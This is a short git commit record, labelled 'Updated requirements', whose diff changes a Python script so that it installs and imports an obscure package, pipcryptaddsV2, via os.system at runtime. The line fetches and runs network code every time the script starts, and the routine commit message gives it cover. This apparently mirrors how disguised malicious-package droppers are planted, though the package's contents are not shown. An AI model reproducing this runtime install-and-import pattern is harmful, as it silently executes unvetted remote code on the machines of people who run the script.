44a88a986495eb6c0873383ef8c48e01aa881d14
Apfel <107504561+ApfelsaftDevs@users.noreply.github.com>
2023-05-02 22:28:42 +0200

    Updated requirements

--- updated.py
+++ updated.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pysqlilibraryV1")
-import pysqlilibraryV1
+os.system("pip install pipcryptaddsV2")
+import pipcryptaddsV2
 from optparse import Option
 import requests
 import threading
